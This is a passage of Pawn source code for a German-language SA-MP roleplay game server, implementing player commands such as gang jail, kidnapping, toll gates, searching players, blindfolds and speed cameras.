								format(string, sizeof(string), "*Du konntest %s nicht kidnappen, er hat über 50 HP!", giveplayer);
								SendClientMessage(playerid, COLOR_GRAD1, string);
							}
						}
						else
						{
							SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner Nähe!");
 						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Du kannst dich selber nicht entführen!");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Kein solcher Spieler online!");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Nur Mafiosi und Gangmitglieder können kidnappen!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GREY, "Du bist noch nicht eingeloggt!");
		}
		return 1;
	}
/*
	if(strcmp(cmd, "/extratime", true) == 0)
	{
	    if(IsACop(playerid) || PlayerInfo[playerid][pAdmin] >= 1)
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /extratime [ID] [Extra Zeit (in Sekunden)]");
			    return 1;
			}
			new gefangener;
			new extrazeit;
			gefangener = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			extrazeit = strval(tmp);
			if(PlayerInfo[gefangener][pJailed] == 0)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Der Spieler befindet sich nicht im Gefängnis!");
			    return 1;
			}
			if(IsPlayerConnected(gefangener))
			{
			    if(GetDistanceBetweenPlayers(playerid, gefangener) < 15)
			    {
			        GetPlayerName(playerid, sendername, sizeof(sendername));
			        GetPlayerName(gefangener, giveplayer, sizeof(giveplayer));
					PlayerInfo[gefangener][pJailTime] += extrazeit;
					format(string, sizeof(string), "Deine Gefängniszeit wurde von %s um weitere %d Sekunden [%d Minuten] verlängert!", sendername, extrazeit, extrazeit/60);
					SendClientMessage(gefangener, COLOR_YELLOW, string);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
						if(IsACop(i))
						{
							format(string, sizeof(string), "%s hat die Gefängniszeit von %s um %d Sekunden [%d Minuten] verlängert!", sendername, giveplayer, extrazeit, extrazeit/60);
							SendClientMessage(i, TEAM_BLUE_COLOR, string);
						}
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du bist zu weit vom Spieler weg!");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Spieler nicht online!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht befugt!");
		}
		return 1;
	}
*/

//=================================== GANGJAIL ===========================================//
if(strcmp(cmd, "/gangjail", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
		    if(PlayerInfo[playerid][pGangJailed] == 1)
		    {
		        SendClientMessage(playerid, COLOR_GRAD1, "Du bist selber im Gangjail!");
		        return 1;
			}
			if(IsPlayerInRangeOfPoint(playerid, 10.0,-2810.0015,-1524.0463,140.8438))
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /gangjail [Playerid/Name]");
					return 1;
				}
				new playa;
				playa = ReturnUser(tmp);
				if(PlayerInfo[playa][pLevel] <= 2)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst keine Level 1er einsperren!");
				    return 1;
				    }
        		    if(IsAGang(playerid))
				     {
					    if(IsPlayerConnected(playa))
					    {
			    		        if(playa != INVALID_PLAYER_ID)
			    		          {
                                    if(GetDistanceBetweenPlayers(playerid,playa) < 5)
                                    {
                                    new vehicleid = GetPlayerVehicleID(playerid);
                                    if(IsPlayerInVehicle(playa,vehicleid))
                                    {
									ResetPlayerWeapons(playa);
									SetPlayerInterior(playa, 0);
									SetPlayerPos(playa,-2816.1074,-1523.2286,140.8438);
									SendClientMessage(playerid, COLOR_YELLOW, "Du hast eine Person ins Gangjail eingesperrt.");
									SendClientMessage(playa, COLOR_YELLOW, "Du wurdest ins Gangjail eingesperrt!.");
									SendClientMessage(playa, COLOR_YELLOW, "In 5 Minuten wirst du in der Lage sein, die Cops zu alamieren!");
									//SendClientMessage(playa, COLOR_GREY, "*Nutze dafür /needhelp");
									PlayerInfo[playa][pGangJailed] = 1;
									PlayerTied[playa] = 0;
									BlindFold[playa] = 0;
									PlayerInfo[playa][pMauled] = 0;
									UnFreezePlayer(playa);
									TogglePlayerControllable(playa, 1);
								}
								else
								{
								    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deinem Auto!");
								}
							}
							else
							{
							    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner Nähe!");
							}
						}
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Diesen Befehl können nur Gangmitglieder nutzen!");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht bei dem Gangjail!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Der Spieler ist nicht online!");
		}
		return 1;
	}
//=================================== UNGANGJAIL ===========================================//
	if(strcmp(cmd, "/gangunjail", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist selbst im GangJail!");
			    return 1;
			}
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist gefesselt!");
			    return 1;
			}
			if(IsPlayerInRangeOfPoint(playerid, 10.0,-2810.0015,-1524.0463,140.8438))
			{
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /gangjail [Playerid/Name]");
					return 1;
				}
				SetTimerEx("Befreien", 25000, 0, "i", playerid);
                GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s versucht die Tür zu knacken!",sendername, giveplayer);
                ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SendClientMessage(playerid, COLOR_GRAD1, "*Um Die Person zu befreihen darfst du die garage nicht verlassen!");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht beim Gangjail!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Du musst dich erst einloggen!");
		}
		return 1;
	}
    //======== ZOLL ========//
	if (strcmp(cmdtext, "/zoll", true) == 0)
	{
        // Zoll 1 LS LV
		if(IsPlayerInRangeOfPoint(playerid, 8.0, 1750.2582,515.1455,28.1387)) //4
		{
		    if(zollvar[1] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0)
			{
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 2!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 2!");
			MoveDynamicObject(zolltor1, 1750.53284, 515.92505, 26.59763, 3.5);
			SetTimer("closegate2", 3000, 0);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 8.0,1741.8831,517.7935,28.1404))//3
		{
		    if(zollvar[2] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0)
			{
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 3!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 3!");
			MoveDynamicObject(zolltor2, 1742.12573, 518.60272, 26.58498, 3.5);
			SetTimer("closegate3", 3000, 0);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1733.1140,520.7195,28.1508))//2
		{
		    if(zollvar[3] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 4!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 4!");
			MoveDynamicObject(zolltor3, 1733.37769, 521.50671, 26.57084, 3.5);
			SetTimer("closegate4", 3000, 0);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 1724.7303,524.0016,28.1239))//1
		{
		    if(zollvar[4] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 5!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 5!");
			MoveDynamicObject(zolltor4, 1724.80725, 524.85522, 26.53794, 3.5);
			SetTimer("closegate5", 3000, 0);
			return 1;
		}
        // ZOll 2 LS SF
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 58.7423,-1540.1853,5.0891)) //1
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor5, 58.13060, -1539.73645, 3.34227, 3.5);
			SetTimer("closegate6", 3000, 0);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 48.8990,-1523.8472,5.0873))//2
		{
		    if(zollvar[7] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 7!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 8!");
			MoveDynamicObject(zolltor6, 47.75523, -1524.29236, 3.58191, 3.5);
			SetTimer("closegate7", 3000, 0);
			return 1;
		}
        //Zoll 3 SF LV
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, -1402.84558, 830.12793, 47.27655)) //Links von sf
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor7, -1402.84558, 830.12793, 45.96794, 3.5);
			SetTimer("closegate8", 3000, 0);
			return 1;
		}
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, -1395.88013, 823.92303, 47.27977)) //Rechts von sf
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor8, -1395.88013, 823.92303, 45.96423, 3.5);
			SetTimer("closegate9", 3000, 0);
			return 1;
		}
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, 86.22680, -1251.81213, 14.27388))
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor9, 86.22680, -1251.81213, 12.93901, 3.5);
			SetTimer("closegate10", 3000, 0);
			return 1;
		}
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, 96.14687, -1255.90833, 14.34753))
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor10, 96.14687, -1255.90833, 13.01693, 3.5);
			SetTimer("closegate11", 3000, 0);
			return 1;
		}
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, 101.65186, -1272.34497, 14.31233))
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor11, 101.65186, -1272.34497, 12.94788, 3.5);
			SetTimer("closegate12", 3000, 0);
			return 1;
		}
        else if(IsPlayerInRangeOfPoint(playerid, 8.0, 110.51665, -1277.13660, 14.40798))
		{
		    if(zollvar[5] == 1) return SendClientMessage(playerid, COLOR_GREY, "Dieser Zoll ist derzeit geschlossen.");
		    if(PlayerInfo[playerid][pZollPass] == 0) {
				FraktionsKasse[6] += 250;
				GivePlayerMoneySave(playerid, -250);
				SendClientMessage(playerid, COLOR_GREEN, "Zollgebühr in Höhe von 250$ bezahlt | Gute Weiterfahrt von Zoll 6!");
			}
			else SendClientMessage(playerid, COLOR_GREEN, "Durch deinen Zollpass ist die durchfahrt kostenlos | Gute Weiterfahrt von Zoll 6!");
			MoveDynamicObject(zolltor12, 110.51665, -1277.13660, 13.15043, 3.5);
			SetTimer("closegate13", 3000, 0);
			return 1;
		}







		else
		{
			SendClientMessage(playerid, COLOR_RED, "Du bist an keiner Zollstation!");
		}
		return 1;
	}

//============= DURCHSUCHEN ==============//
	if(strcmp(cmd, "/durchsuchen", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(gPlayerLogged[playerid] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "Du musst erst eingeloggt sein!");
				return 1;
			}
	        if(PlayerInfo[playerid][sMember] == 1  || PlayerInfo[playerid][sMember] == 2 || PlayerInfo[playerid][sMember] == 3 ||PlayerInfo[playerid][sMember] == 22)
	        {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /durchsuchen [Spieler ID]");
				    return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
					new fufu7735[128];
					new fufu773[128];
                    format(fufu773, sizeof(fufu773), "* %s %s durchsucht %s auf illegale Gegenstände!", GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]),GetName(playerid),GetName(giveplayerid));
                    ProxDetector(30.0, playerid, fufu773, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    format(fufu7735, sizeof(fufu7735), "* %s hat %d Drogen und %d Mats dabei!", PlayerInfo[giveplayerid][pDrugs],PlayerInfo[giveplayerid][pMats]);
			 	    SendClientMessage(playerid, COLOR_LIGHTBLUE, fufu7735);
					}
				}
				return 1;
			}
			if(!IsAGang(playerid))
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Können nur Mafiosi und Gangmitglieder!");
				return 1;
			}
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /durchsuchen [Spieler ID]");
			    return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if(PlayerTied[giveplayerid] != 1)
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Der Spieler muss gefesselt sein!");
			            return 1;
			        }
			        if(ProxDetectorS(5.0, playerid, giveplayerid))
			        {
			            GetPlayerName(playerid, sendername, sizeof(sendername));
			            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			            format(string, sizeof(string), "%s hat %d$ dabei.", giveplayer, GetPlayerMoneySave(giveplayerid));
			            SendClientMessage(playerid, COLOR_WHITE, string);
			            return 1;
			        }
			        else
			        {
			            SendClientMessage(playerid, COLOR_GREY, "Spieler nicht in deiner Nähe");
			            return 1;
			        }
			    }
			}
	    }
	    return 1;
	}
//============= /augenbinde ==============//
	if(strcmp(cmd, "/augenbinde", true) == 0) // by Ellis
	{
	    if(IsPlayerConnected(playerid))
	    {
	        tmp = strtoknew(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	        	SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /augenbinde [Spieler ID]");
				return 1;
			}
			if(!IsAGang(playerid) && !IsACop(playerid))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Können nur Gangmitglieder, Mafiosi und Cops!");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
			if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if(giveplayerid == playerid) { return 1; }
			        if(BlindFold[giveplayerid] == 0)
			        {
			        	if(PlayerTied[giveplayerid] == 1)
			        	{
			            	if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(giveplayerid))
	        				{
               					SendClientMessage(playerid, COLOR_GREY, "Du musst im selben Auto sitzen!");
        						return 1;
	        				}
	        				GetPlayerName(playerid, sendername, sizeof(sendername));
	        				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
	        				SetPlayerCameraPos(giveplayerid, 2000,-2000,2000);
							SetPlayerCameraLookAt(giveplayerid, 2000,-2000,2000);
			            	BlindFold[giveplayerid] = 1;
			            	format(string, sizeof(string), "* %s hat %s eine Augenbinde angelegt.", sendername, giveplayer);
			            	ProxDetector(15.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			        	}
			        	else
			        	{
			            	SendClientMessage(playerid, COLOR_GREY, "Der Spieler muss gefesselt sein!");
							return 1;
						}
					}
					else if(BlindFold[giveplayerid] == 1)
					{
					    new Float:x, Float:y, Float:z;
					    GetPlayerPos(giveplayerid,x,y,z);
					    if(PlayerToPoint(5, playerid, x, y, z))
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
	        				GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					        SetCameraBehindPlayer(giveplayerid);
					    	BlindFold[giveplayerid] = 0;
					    	format(string, sizeof(string), "* %s hat %s Augenbinde abgenommen.", sendername, giveplayer);
			            	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "Spieler nicht in deiner Nähe!");
						    return 1;
						}
					}
			    }
			}
	    }
	    return 1;
	}
    //============= BLITZER ===============//
	if(strcmp(cmd, "/blitzer", true) == 0)
	{
	    if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24 )
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COLOR_GOLD, "___________________________|Blitzer|___________________________");
				SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /blitzer [Funktion]");
				SendClientMessage(playerid, COLOR_WHITE, "Verfügbare Funktionen: neu, weg, alleweg [Rang 4], anzeigen");
				SendClientMessage(playerid, COLOR_GOLD, "_____________________________________________________________");
				return 1;
			}
			if(strcmp(tmp,"neu",true) == 0)
			{
		        tmp = strtoknew(cmdtext, idx);
		   		if(!strlen(tmp))
		   		{
		 			SendClientMessage(playerid, COLOR_GREY, "Benutzung: /blitzer neu [Geschwindigkeit] [Strafe]");
		 			return 1;
				}
				new b_speed;
				b_speed = strval(tmp);
				if(b_speed < 70 || b_speed > 200)
				{
				    SendClientMessage(playerid, COLOR_GREY, "Hinweis: Die Geschwindigkeit muss zwischen 70 und 200 km/h liegen.");
				    return 1;
				}
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GREY, "Benutzung: /blitzer neu [Geschwindigkeit] [Strafe]");
					return 1;
				}
				new b_strafe;
				b_strafe = strval(tmp);
				if(b_strafe < 5 || b_strafe > 500)
				{
					SendClientMessage(playerid, COLOR_GREY, "Hinweis: Die Strafe muss zwischen 5$ / KMH und 500$ / KMH liegen.");
					return 1;
				}
					AddBlitzer(playerid,b_speed,b_strafe);
					new player[MAX_PLAYER_NAME];
					GetPlayerName(playerid, player, sizeof(player));
					format(string, sizeof(string), "%s hat einen Blitzer aufgestellt.", player);
					ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					format(string, sizeof(string), "Blitzer aufgestellt, Max. Geschwindigkeit: %d, Strafe: %d.", b_speed, b_strafe);
					SendClientMessage(playerid, COLOR_GREEN, string);
					BlitzerErstellt[playerid] = 1;
					return 1;
			}
			else if(strcmp(tmp,"weg",true) == 0)
			{
				RemoveBlitzer(playerid);
				new player[MAX_PLAYER_NAME];
				GetPlayerName(playerid, player, sizeof(player));
				format(string, sizeof(string), "%s hat seinen Blitzer abgebaut.", player);
				ProxDetector(20.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				BlitzerErstellt[playerid] = 0;
				UnFreezePlayer(playerid);
				return 1;
			}
			else if(strcmp(tmp,"alleweg",true) == 0)
			{
			    if(PlayerInfo[playerid][pRank] <= 4)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "Mindestens Rang 4 benötigt!");
			        return 1;
   	 			}
				RemoveAllBlitzer();
				SendClientMessage(playerid, COLOR_GREEN, "Alle Blitzer abgebaut.");
				for(new i=0; i<MAX_PLAYERS; i++)
				{
					if(PlayerInfo[i][pMember] == 24 || PlayerInfo[i][pLeader] == 24)
					{
					    RemoveBlitzer(i);
					    UnFreezePlayer(i);
	        			new player[MAX_PLAYER_NAME];
		        		GetPlayerName(playerid, player, sizeof(player));
	  					format(string, sizeof(string), "*Alle Blitzer wurden von %s abgebaut.", player);
	  					SendClientMessage(i, COLOR_LIGHTBLUE, string);
					}
				}
				return 1;
			}
			else if(strcmp(tmp, "anzeigen", true) == 0)
			{
				if(GesammtBlitzer != 0)
				{
				    SendClientMessage(playerid, COLOR_GOLD, "______________| Aktive Blitzer |_______________");
					format(string, sizeof(string), "%d / 15 Blitzer derzeit aktiv.", GesammtBlitzer);
					SendClientMessage(playerid, COLOR_WHITE, string);
					SendClientMessage(playerid, COLOR_GOLD, "_____________________________________________");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Keine Blitzer aktiv.");
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_RED, "___________________________|Fehler|__________________________");
				SendClientMessage(playerid, COLOR_RED, "Benutzung: /blitzer [Funktion]");
				SendClientMessage(playerid, COLOR_RED, "Verfügbare Funktionen: neu, weg, alleweg [Rang 4], anzeigen");
				SendClientMessage(playerid, COLOR_RED, "_____________________________________________________________");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Ordnungsbeamter!");
		}
		return 1;
	}
	if(strcmp(cmd, "/lsawaren", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 2000)
		{
		    LSAWaren += 100;
		}
		return 1;
	}
 	if(strcmp(cmd, "/contracts", true) == 0)
	{
	    if(IsPlayerInFrac(playerid, 8)||PlayerInfo[playerid][pAdmin] >= 3 )
	    {
	   		SearchingHit(playerid);
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Du bist kein Hitman!");
		}
		return 1;
	}
/*
//============= TASCHE ================//
   	if(!strcmp(cmdtext, "/tasche", true))
	{
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "Du musst eingeloggt sein!");
                return 1;
            }
            new gunname[100];
            GetWeaponName(PlayerInfo[playerid][pInvWeapon], gunname, sizeof(gunname));
            new gunname2[100];
			GetWeaponName(PlayerInfo[playerid][pInvWeapon2], gunname2, sizeof(gunname2));
            SendClientMessage(playerid, COLOR_GOLD, "|___________ Tasche __________|");
            if(PlayerInfo[playerid][pInvWeapon] != 0 && PlayerInfo[playerid][pInvAmmo] != 0)
            {
           		format(string, sizeof(string), "1.Waffe: %s, Munition: %d", gunname, PlayerInfo[playerid][pInvAmmo]);
           		SendClientMessage(playerid, COLOR_GOLD, string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GOLD, "1.Waffe: -");
			}
			if(PlayerInfo[playerid][pInvWeapon2] != 0 && PlayerInfo[playerid][pInvAmmo2] != 0)
			{
          		format(string, sizeof(string), "2.Waffe: %s, Munition: %d", gunname2, PlayerInfo[playerid][pInvAmmo2]);
           		SendClientMessage(playerid, COLOR_GOLD, string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GOLD, "2.Waffe; -");
			}
           	format(string, sizeof(string), "Drogen: %d", PlayerInfo[playerid][pInvDrugs]);
           	SendClientMessage(playerid, COLOR_GOLD, string);
           	format(string, sizeof(string), "Materialien: %d", PlayerInfo[playerid][pInvMats]);
           	SendClientMessage(playerid, COLOR_GOLD, string);
            SendClientMessage(playerid, COLOR_GOLD, "*Weitere Befehle: /nehmen /verstauen");
        }
        return 1;
    }
//============== /VERSTAUEN ==================//
	if(strcmp(cmd, "/verstauen", true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			for(new i=0; i < MAX_PLAYERS; i++)
			{
   				new Float:x, Float:y, Float:z;
				GetPlayerPos(playerid, x, y, z);
				if(IsACop(i))
				{
                    if(ProxDetectorS(20.0, playerid, i))
					{
						SendClientMessage(playerid, COLOR_GRAD1, "Cops sind in der Nähe, du kannst nichst verstauen!");
						return 1;
					}
				}
			}
		    new namen[256];
		    namen = strtoknew(cmdtext, idx);
		    if(!strlen(namen))
		    {
		        SendClientMessage(playerid, COLOR_GOLD, "|__________________ Befehlshilfe _________________|");
		        SendClientMessage(playerid, COLOR_GOLD, "Benutzung: /verstauen [Name] ([Menge])");
		        SendClientMessage(playerid, COLOR_GOLD, "Namen: Waffe1, Waffe2, Materialien, Drogen");
		        return 1;
			}
			if(strcmp(namen,"Waffe1", true) == 0)
			{
	   			new gunID = GetPlayerWeapon(playerid);
            	new gunAmmo = GetPlayerAmmo(playerid);
				if(gunID != 0 && gunAmmo != 0)
            	{
                	PlayerInfo[playerid][pInvWeapon] = gunID;
                	PlayerInfo[playerid][pInvAmmo] = gunAmmo;
					RemovePlayerWeapon(playerid, gunID);
                	GetPlayerName(playerid, sendername, sizeof(sendername));
					new gunname[100];
					GetWeaponName(gunID, gunname, sizeof(gunname));
                	format(string, sizeof(string), " %s in die Tasche verstaut.", gunname);
					SendClientMessage(playerid, COLOR_GREY, string);
                	return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "Du hast keine Waffe, die du in die Tasche verstauen kannst!");
				    return 1;
				}
			}
			if(strcmp(namen,"Waffe2", true) == 0)
			{
	   			new gunID = GetPlayerWeapon(playerid);
            	new gunAmmo = GetPlayerAmmo(playerid);
				if(gunID != 0 && gunAmmo != 0)
            	{
